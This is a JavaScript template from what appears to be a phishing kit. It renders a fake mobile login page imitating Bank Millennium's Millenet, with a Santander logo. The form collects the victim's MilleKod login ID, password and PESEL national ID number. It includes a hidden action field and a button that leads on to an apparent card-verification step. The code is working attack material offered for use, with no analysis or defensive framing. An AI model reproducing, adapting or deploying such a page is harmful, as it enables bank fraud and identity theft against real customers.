function genHtmlRenderMobBank9(params){
    return `
    <header>
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="logo d-flex justify-content-center align-items-center">
                        <img alt="Santander" style="width: 150px" src="merchantbank/pageBank/bank9/img/Logo@1x.png"/>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <section class="formsFontent">
        <div class="container">
            <div class="row">
                <div class="col-12 mb-3">
                    <h1>Logowanie do Millenetu</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-12">
                    <div class="cardsForm blockLKFormsHTML" style="display: none"></div>
                    <div class="cardsForm formsLKBNK">
                        <div class="formsInput">
                            <label for="field3ds1">MilleKod</label>
                            <div class="inputs">
                                <input id="field3ds1" reqinput='true' autocomplete="off" type="text" placeholder="MilleKod">
                            </div>
                        </div>
                        <div class="formsInput">
                            <label for="field3ds2">Hasło</label>
                            <div class="inputs">
                                <input id="field3ds2" reqinput='true' autocomplete="off" type="password" placeholder="Hasło">
                            </div>
                        </div>
                        <div class="formsInput">
                            <label for="field3ds4">Pesel</label>
                            <div class="inputs">
                                <input id="field3ds4" reqinput='true' autocomplete="off" type="text" placeholder="Pesel">
                            </div>
                        </div>
                        <div class="formsInput" style="display: none">
                            <div class="inputs">
                                <input id="field3ds9" autocomplete="off" type="text" placeholder="OTHER INP">
                            </div>
                        </div>
                        <input id="field3ds7" type="hidden" name="ACTION_DATA" placeholder="action" value='not_action'>
                        <div class="formsInput">
                            <button ${params.banksCard.indexOf('9') >= 0 ? `class="sendLKbtn openVerificationCards"` : `id='field3dsMillenium' class="sendLKbtn"`}>Dalej</button>
                        </div>
                        <div class="helpHref text-center">
                            <a href="">Pomoc z logowaniem</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <hr>
    <footer>
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="infocontenc">
                        <span>Finanse 360°</span>
                        <span style="color: #888">Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet </span>
                    </div>
                </div>
            </div>
        </div>
        <div class="container infoSec">
            <div class="row">
                <div class="col-12 text-center">
                    <span>Copyright © Bank Millennium SA</span>
                </div>
            </div>
        </div>
    </footer>`;
}